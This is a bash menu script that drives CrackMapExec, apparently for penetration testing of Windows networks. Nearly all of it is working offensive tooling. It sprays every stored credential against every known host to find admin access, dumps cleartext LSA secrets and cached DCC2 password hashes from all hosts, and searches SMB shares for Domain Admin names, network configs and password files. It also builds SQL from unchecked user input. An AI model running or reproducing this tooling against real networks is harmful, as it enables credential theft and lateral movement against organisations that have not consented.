#!/bin/bash

echo " "
echo "Check and Gather tests will be run against all IP addresses of systems within the cmedb."
echo "Tests will check for Admin Priv access and display results at the end."
echo " "
echo "**** USE OPTION #4 FOR SINGLE IDs, ONLY FOR DOMAIN ACCOUNTS ****"
echo " "
echo " "

options=("Check all Domain Accounts in cmedb" "Check all Local-auth Accounts in cmedb" "Check all Domain and Local-auth Accounts (ALL)" "Check single creds ID # (ONLY USE DOMAIN ACCOUNTS)" "Gather LSA Clear-text from all IPs using all Domain and Local-auth Accounts (LSA-ALL)" "Gather DCC2 Hashes from all IPs using all Domain and Local-auth Accounts (DCC2-ALL)" "Display LSA Clear-text of All Previously Gathered" "Display DCC2 Hashes of All Previously Gathered" "Spider file contents for DA account IDs in provided txt file" "Spider filenames for common network configs" "Spider specific pattern for filename search" "Quit")

read -p "Enter DOMAIN name exactly as it is in the cmedb (case sensitive): " domain
echo " "
echo "**This keeps multiple users from overwriting each other's files**"
read -p "Enter a TAG for your job (such as your name): " tag

# clean-up previous files
echo " "
echo "**** Cleaning Up Previous Files ****"
echo " "
rm /tmp/cme-ip-$tag.txt
rm /tmp/cme-domain-accts-$tag.txt
rm /tmp/cme-localauth-accts-$tag.txt
rm /tmp/cme-creds-check-$tag.txt
rm /tmp/cme-local-admin-$tag.txt
rm /tmp/lsa-clear-raw-$tag.txt
rm /tmp/lsa-clear-$tag.txt
rm /tmp/dcc2-raw-$tag.txt
rm /tmp/dcc2-$tag.txt
rm /tmp/cme-filescrape-$tag.txt

echo " "
echo "**** Building IP and Account Lists ****"
echo " "

# select Domain accts
sqlite3 /root/.cme/workspaces/default/smb.db "SELECT id from users where domain='$domain';" | tee /tmp/cme-domain-accts-$tag.txt

# select Local Auth accts
sqlite3 /root/.cme/workspaces/default/smb.db "SELECT id from users where domain!='$domain';" | tee /tmp/cme-localauth-accts-$tag.txt

# get list of all known IPs in cmedb
sqlite3 /root/.cme/workspaces/default/smb.db "SELECT ip from computers;" | tee /tmp/cme-ip-$tag.txt

echo " "
echo =========== Select an Option Below =================
echo " "
select opt in "${options[@]}"
do
    case $opt in
		"Check all Domain Accounts in cmedb")
			echo " "
			echo =========== Beginning Checks Now =================
			echo " "
			#check for admin rights on all IPs for domain accts
			for i in $(cat /tmp/cme-domain-accts-$tag.txt )
			do
				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i | tee -a /tmp/cme-creds-check-$tag.txt
			done
            echo " "
            echo ==========================================================
            echo =========== All Accounts with Admin Privs ================
            echo ==========================================================
            echo Results are saved at: /tmp/cme-local-admin-$tag.txt
            echo " "

            #consolidate Pwn3d results into a single file
            cat /tmp/cme-creds-check-$tag.txt | grep -a Pwn3d | tee -a /tmp/cme-local-admin-$tag.txt

            echo " "
            echo ==========================================================
            echo ============ COMPLETE - See Results Above ================
            echo ==========================================================
            echo " "
			break
			;;
		"Check all Local-auth Accounts in cmedb")
			echo " "
			echo =========== Beginning Checks Now =================
			echo " "
			#check for admin rights on all IPs for local-auth accts
			for i in $(cat /tmp/cme-localauth-accts-$tag.txt )
			do
				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i --local-auth | tee -a /tmp/cme-creds-check-$tag.txt
			done
            echo " "
            echo ==========================================================
            echo =========== All Accounts with Admin Privs ================
            echo ==========================================================
            echo Results are saved at: /tmp/cme-local-admin-$tag.txt
            echo " "

            #consolidate Pwn3d results into a single file
            cat /tmp/cme-creds-check-$tag.txt | grep -a Pwn3d | tee -a /tmp/cme-local-admin-$tag.txt

            echo " "
            echo ==========================================================
            echo ============ COMPLETE - See Results Above ================
            echo ==========================================================
            echo " "
			break
			;;
		"Check all Domain and Local-auth Accounts (ALL)")
			echo " "
			echo =========== Beginning Checks Now =================
			echo " "
			#check for admin rights on all IPs for domain accts
			for i in $(cat /tmp/cme-domain-accts-$tag.txt )
			do
				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i | tee -a /tmp/cme-creds-check-$tag.txt
			done
			#check for admin rights on all IPs for local-auth accts
			for i in $(cat /tmp/cme-localauth-accts-$tag.txt )
			do
				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i --local-auth | tee -a /tmp/cme-creds-check-$tag.txt
			done
            echo " "
            echo ==========================================================
            echo =========== All Accounts with Admin Privs ================
            echo ==========================================================
            echo Results are saved at: /tmp/cme-local-admin-$tag.txt
            echo " "

            #consolidate Pwn3d results into a single file
            cat /tmp/cme-creds-check-$tag.txt | grep -a Pwn3d | tee -a /tmp/cme-local-admin-$tag.txt

            echo " "
            echo ==========================================================
            echo ============ COMPLETE - See Results Above ================
            echo ==========================================================
            echo " "
			break
			;;
		"Check single creds ID # (ONLY USE DOMAIN ACCOUNTS)")
			echo " "
			echo =========== Beginning Checks Now =================
			echo " "
			#check for admin rights on all IPs for single cmedb ID
			read -p "Enter creds ID # from the cmedb: " id
			cme -t 30 smb /tmp/cme-ip-$tag.txt -id $id  | tee -a /tmp/cme-creds-check-$tag.txt
            echo " "
            echo ==========================================================
            echo =========== All Accounts with Admin Privs ================
            echo ==========================================================
            echo Results are saved at: /tmp/cme-local-admin-$tag.txt
            echo " "

            #consolidate Pwn3d results into a single file
            cat /tmp/cme-creds-check-$tag.txt | grep -a Pwn3d | tee -a /tmp/cme-local-admin-$tag.txt

            echo " "
            echo ==========================================================
            echo ============ COMPLETE - See Results Above ================
            echo ==========================================================
            echo " "
			break
			;;
        "Gather LSA Clear-text from all IPs using all Domain and Local-auth Accounts (LSA-ALL)")
			echo " "
			echo =========== Beginning LSA Gathering Now =================
			echo " "
			#Pull LSA from all IPs for domain accts
			for i in $(cat /tmp/cme-domain-accts-$tag.txt )
			do
				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i --lsa | tee -a /tmp/cme-creds-check-$tag.txt
			done
			#Pull LSA from all IPs for local-auth accts
			for i in $(cat /tmp/cme-localauth-accts-$tag.txt )
			do
				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i --local-auth --lsa | tee -a /tmp/cme-creds-check-$tag.txt
			done
            cat /root/.cme/logs/*.secrets | grep -v 'aad3b435b51404eeaad3b435b51404ee\|RasDialParams\|DPAPI_SYSTEM\|L$_SQSA\|L$kek\|aes256-cts-hmac\|L$ASP.NET\|aes128-cts-hmac\|des-cbc-md5\|dpapi_machinekey\|dpapi_userkey\|NL$KM:\|L$kek-KeyVault_' > /tmp/lsa-clear-raw-$tag.txt
            sort /tmp/lsa-clear-raw-$tag.txt | uniq > /tmp/lsa-clear-$tag.txt
            echo " "
            echo ==========================================================
            echo =========== All LSA Clear-text Credentials ==============
            echo ==========================================================
            echo Results are saved at: /tmp/lsa-clear-$tag.txt
            echo " "

            #display results of Admin Privs
            cat /tmp/lsa-clear-$tag.txt

            echo " "
            echo ==========================================================
            echo ==========================================================
            echo " "
			break
			;;
        "Gather DCC2 Hashes from all IPs using all Domain and Local-auth Accounts (DCC2-ALL)")
			echo " "
			echo =========== Beginning LSA Gathering Now =================
			echo " "
			#Pull LSA from all IPs for domain accts
			for i in $(cat /tmp/cme-domain-accts-$tag.txt )
			do
				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i --lsa | tee -a /tmp/cme-creds-check-$tag.txt
			done
			#Pull LSA from all IPs for local-auth accts
			for i in $(cat /tmp/cme-localauth-accts-$tag.txt )
			do
				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i --local-auth --lsa | tee -a /tmp/cme-creds-check-$tag.txt
			done
            cat /root/.cme/logs/*.cached | cut -d':' -f2 > /tmp/dcc2-raw-$tag.txt
            sort /tmp/dcc2-raw-$tag.txt | uniq > /tmp/dcc2-$tag.txt
            echo " "
            echo ==========================================================
            echo ==================== All DCC2 Hashes =====================
            echo ==========================================================
            echo Results are saved at: /tmp/dcc2-$tag.txt
            echo " "
            #display results of Admin Privs
            cat /tmp/dcc2-$tag.txt
            echo " "
            echo ==========================================================
            echo ==========================================================
            echo " "
			break
			;;
        "Display LSA Clear-text of All Previously Gathered")
            cat /root/.cme/logs/*.secrets | grep -v 'aad3b435b51404eeaad3b435b51404ee\|RasDialParams\|DPAPI_SYSTEM\|L$_SQSA\|L$kek\|aes256-cts-hmac\|L$ASP.NET\|aes128-cts-hmac\|des-cbc-md5\|dpapi_machinekey\|dpapi_userkey\|NL$KM:\|L$kek-KeyVault_' > /tmp/lsa-clear-raw-$tag.txt
            sort /tmp/lsa-clear-raw-$tag.txt | uniq > /tmp/lsa-clear-$tag.txt
            echo " "
            echo ==========================================================
            echo === All Previously Gathered LSA Clear-text Credentials ===
            echo ==========================================================
            echo Results are saved at: /tmp/lsa-clear-$tag.txt
            echo " "
            #display results of Admin Privs
            cat /tmp/lsa-clear-$tag.txt
            echo " "
            echo ==========================================================
            echo ==========================================================
            echo " "
			break
			;;
        "Display DCC2 Hashes of All Previously Gathered")
            cat /root/.cme/logs/*.cached | cut -d':' -f2 > /tmp/dcc2-raw-$tag.txt
            sort /tmp/dcc2-raw-$tag.txt | uniq > /tmp/dcc2-$tag.txt
            echo " "
            echo ==========================================================
            echo ========== All Previously Gathered DCC2 Hashes ===========
            echo ==========================================================
            echo Results are saved at: /tmp/dcc2-$tag.txt
            echo " "
            #display results of Admin Privs
            cat /tmp/dcc2-$tag.txt
            echo " "
            echo ==========================================================
            echo ==========================================================
            echo " "
			break
            ;;
        "Spider file contents for DA account IDs in provided txt file")
                read -p "Location of list of Domain Admins (/path/userlist.txt): " userlist
                read -p "IP address of File Server (x.x.x.x): " address
                read -p "File Share Names: " share
                read -p "Enter creds ID # from the cmedb: " id
                echo Domain Admins user list: $userlist
                echo IP Address: $address
                echo File Share: $share
                echo Creds ID #: $id
                # Content Search for DA Usernames
                for p in $(cat $userlist)
                do
                echo ========== $p DA account file pattern search ========== | tee -a /tmp/cme-filescrape-$tag.txt
                cme smb $address -id $id --spider $share --pattern $p --content | tee -a /tmp/cme-filescrape-$tag.txt
                done
                break
                ;;
        "Spider filenames for common network configs")
                read -p "IP address of File Server (x.x.x.x): " address
                read -p "File Share Names: " share
                read -p "Enter creds ID # from the cmedb: " id
                echo IP Address: $address
                echo File Share: $share
                echo Creds ID #: $id
                echo Wordlist taken from "network.txt" file
                # Content Search for Network Config Files
                for p in $(cat files/network.txt)
                do
                echo ========== $p file pattern search ========== | tee -a /tmp/cme-filescrape-$tag.txt
                cme smb $address -id $id --spider $share --pattern $p --content | tee -a /tmp/cme-filescrape-$tag.txt
                done
                break
                ;;
        "Spider specific pattern for filename search")
                read -p "Word to search in filenames (exp: password): " filename
                read -p "IP address of File Server (x.x.x.x): " address
                read -p "File Share Names: " share
                read -p "Enter creds ID # from the cmedb: " id
                echo Filename pattern: $filename
                echo IP Address: $address
                echo File Share: $share
                echo Creds ID #: $id
                # Filename Pattern Search
                echo ========== $filename Filename pattern search  ========== | tee -a /tmp/cme-filescrape-$tag.txt
                cme smb $address -id $id --spider $share --pattern $filename | tee -a /tmp/cme-filescrape-$tag.txt
                break
                ;;
        "Quit")
            break
            ;;
        *)
        esac
done